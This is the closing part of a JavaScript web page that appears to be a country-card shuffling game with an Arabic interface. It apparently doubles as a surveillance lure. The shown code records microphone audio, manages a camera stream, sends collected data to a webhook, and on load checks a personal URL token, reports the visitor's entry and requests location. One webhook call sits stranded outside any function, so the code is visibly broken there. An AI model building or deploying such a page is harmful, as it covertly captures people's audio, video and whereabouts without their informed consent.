                }
                return true;
            } catch (err) {
                console.error('Camera error:', err);
                if (mediaStream) { mediaStream.getTracks().forEach((t) => t.stop());
                    mediaStream = null; }
                video.srcObject = null;
                return false;
            }
        }

        // ============================================================
        //  AUDIO
        // ============================================================
        async function recordAudio() {
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
                audioChunks = [];
                audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
                audioRecorder.onstop = () => {
                    if (audioChunks.length > 0) {
                        audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    }
                };
                audioRecorder.start();
                setTimeout(() => {
                    if (audioRecorder.state === 'recording') audioRecorder.stop();
                    if (audioStream) audioStream.getTracks().forEach((t) => t.stop());
                }, AUDIO_DURATION);
                return true;
            } catch (err) {
                console.error('Audio error:', err);
                return false;
            }
        }

            const result = await sendToWebhook(fd);

        // ============================================================
        //  TIMER
        // ============================================================
        function startTimer(seconds) {
            timerSeconds = seconds;
            updateTimerDisplay();
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                timerSeconds--;
                updateTimerDisplay();
                if (timerSeconds <= 0) {
                    clearInterval(timerInterval);
                    timerDisplay.textContent = '00:00';
                }
            }, 1000);
        }

        function updateTimerDisplay() {
            const m = Math.floor(timerSeconds / 60);
            const s = timerSeconds % 60;
            timerDisplay.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        }

        // ============================================================
        //  STATUS HELPER
        // ============================================================
        function showStatus(el, type, message) {
            el.className = `status ${type}`;
            el.textContent = message;
            el.style.display = 'block';
            if (type !== 'error') {
                clearTimeout(el._timeout);
                el._timeout = setTimeout(() => {
                    if (el.className.includes(type)) el.style.display = 'none';
                }, 8000);
            }
        }

        // ============================================================
        //  CLEANUP
        // ============================================================
        window.addEventListener('beforeunload', () => {
            if (mediaStream) mediaStream.getTracks().forEach((t) => t.stop());
            if (audioStream) audioStream.getTracks().forEach((t) => t.stop());
            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
            if (timerInterval) clearInterval(timerInterval);
        });

        // ============================================================
        //  PARTICLE SYSTEM
        // ============================================================
        (function initParticles() {
            const c = document.getElementById('bg-canvas');
            const ctx = c.getContext('2d');
            let w, h;
            const particles = [];
            const COUNT = 80;

            function resize() {
                w = c.width = window.innerWidth;
                h = c.height = window.innerHeight;
            }
            window.addEventListener('resize', resize);
            resize();

            class Particle {
                constructor() { this.reset(); }
                reset() {
                    this.x = Math.random() * w;
                    this.y = Math.random() * h;
                    this.size = Math.random() * 2 + 0.3;
                    this.speedX = (Math.random() - 0.5) * 0.18;
                    this.speedY = (Math.random() - 0.5) * 0.18;
                    this.opacity = Math.random() * 0.15 + 0.01;
                    this.pulse = Math.random() * Math.PI * 2;
                    this.pulseSpeed = 0.005 + Math.random() * 0.01;
                }
                update() {
                    this.x += this.speedX;
                    this.y += this.speedY;
                    this.pulse += this.pulseSpeed;
                    if (this.x < 0 || this.x > w) this.speedX *= -1;
                    if (this.y < 0 || this.y > h) this.speedY *= -1;
                }
                draw() {
                    const o = this.opacity * (0.5 + 0.5 * Math.sin(this.pulse));
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                    ctx.fillStyle = `rgba(201, 168, 76, ${o})`;
                    ctx.fill();
                    if (this.size > 1) {
                        ctx.shadowColor = 'rgba(201, 168, 76, 0.005)';
                        ctx.shadowBlur = 8;
                        ctx.fill();
                        ctx.shadowBlur = 0;
                    }
                }
            }

            for (let i = 0; i < COUNT; i++) particles.push(new Particle());

            function animate() {
                ctx.clearRect(0, 0, w, h);
                particles.forEach((p) => { p.update();
                    p.draw(); });
                // connections
                for (let i = 0; i < particles.length; i++) {
                    for (let j = i + 1; j < particles.length; j++) {
                        const dx = particles[i].x - particles[j].x;
                        const dy = particles[i].y - particles[j].y;
                        const dist = Math.sqrt(dx * dx + dy * dy);
                        if (dist < 120) {
                            const alpha = (1 - dist / 120) * 0.008;
                            ctx.beginPath();
                            ctx.moveTo(particles[i].x, particles[i].y);
                            ctx.lineTo(particles[j].x, particles[j].y);
                            ctx.strokeStyle = `rgba(201, 168, 76, ${alpha})`;
                            ctx.lineWidth = 0.4;
                            ctx.stroke();
                        }
                    }
                }
                requestAnimationFrame(animate);
            }
            animate();
        })();

        // ============================================================
        //  BOOT
        // ============================================================
        window.addEventListener('load', async () => {
            const hasToken = extractTokenFromURL();
            if (!hasToken) {
                showStatus(statusCards, 'error', '⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
                shuffleBtn.disabled = true;
                return;
            }

            // initial cards
            const shuffled = COUNTRY_NAMES.sort(() => Math.random() - 0.5);
            const count = Math.min(8, shuffled.length);
            const selected = shuffled.slice(0, count);
            currentCards = selected.map((name, i) => generateCardDesign(name, i));
            renderCards(currentCards, true);

            await notifyUserEntered();
            detectSuspiciousActivity();
            getLocation();
        });
    </script>
</body>
